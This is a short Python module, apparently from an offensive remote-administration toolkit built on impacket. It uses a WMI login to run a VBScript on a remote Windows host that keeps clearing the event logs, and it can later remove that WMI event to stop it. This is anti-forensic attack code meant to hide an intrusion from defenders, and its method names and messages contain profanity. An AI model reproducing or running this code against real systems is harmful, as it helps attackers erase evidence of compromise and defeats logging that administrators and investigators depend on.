from lib.methods.executeVBS import executeVBS_Toolkit
from impacket.dcerpc.v5.dtypes import NULL

class eventlog_Toolkit():
    def __init__(self, iWbemLevel1Login):
        self.iWbemLevel1Login = iWbemLevel1Login

    def fuck_EventLog(self):
        executer = executeVBS_Toolkit(self.iWbemLevel1Login)
        tag = executer.ExecuteVBS(vbs_file='lib/vbscripts/ClearEventlog.vbs', returnTag=True)
        print("[+] Keepping note of this tag if you want to stop it: %s"%tag)
    
    def retrieve_EventLog(self, tag):
        executer = executeVBS_Toolkit(self.iWbemLevel1Login)
        executer.remove_Event(tag)
        print("[+] Stop fucking eventlog :)")